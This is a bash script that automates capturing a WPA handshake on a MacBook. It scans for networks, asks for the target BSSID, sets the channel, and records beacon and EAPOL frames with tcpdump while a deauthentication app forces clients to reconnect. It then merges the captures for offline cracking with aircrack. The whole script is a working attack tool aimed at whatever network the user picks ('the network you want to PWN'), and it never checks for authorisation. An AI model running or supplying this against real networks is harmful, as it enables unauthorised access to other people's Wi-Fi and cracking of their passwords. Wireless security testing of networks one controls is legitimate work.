#!/bin/bash
# Pretty much just a series of commands to capture a handshake from a WPA network on any MacBook.
# Commands selected from https://louisabraham.github.io/articles/WPA-wifi-cracking-MBP.html

echo ------------------------------------
echo "ELEET AUTOMATED MACBOOK WPA HANDSHAKE SNATCHIN' MACHINE"
echo ------------------------------------
echo "Be sure to open your deauth app/script now and perform scans, as we cannot scan once we enter monitor mode."
echo "JamWiFi is a nice app to do this: https://github.com/unixpickle/JamWiFi"
echo ------------------------------------
echo -n "Enter name of your WiFi card (either en0 or en1, see ifconfig if you don't know): "
read CARD
echo "Scanning networks: ensure you are not already in monitor mode with the deauth app, or nothing will be outputted!"
sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport -s
echo ------------------------------------
echo -n "Enter the BSSID of the network you want to PWN: "
read BSSID
echo ------------------------------------
echo "Dissociating and setting channel 10..."
echo ------------------------------------
sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport -z
sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport -c10
echo "Capturing beacon..."
echo ------------------------------------
sudo tcpdump "type mgt subtype beacon and ether src $BSSID" -I -c 1 -i $CARD -w /tmp/beacon.cap
echo ------------------------------------
echo "Capturing handshakes: perform jams now, wait until we capture around 50 packets then enter CTRL^C..."
echo ------------------------------------
sudo tcpdump "ether proto 0x888e and ether host $BSSID" -I -U -vvv -i $CARD -w /tmp/handshake.cap
echo ------------------------------------
echo "Captures completed: merging pcaps..."
mergecap -a -F pcap -w /tmp/$(date) /tmp/beacon.cap /tmp/handshake.cap
sudo rm /tmp/beacon.cap
sudo rm /tmp/handshake.cap
echo pcap saved as /tmp/$(date)
echo "You may now use aircrack or your choice of bruteforcer against the pcap, provided handshakes were performed on the network while we were listening."
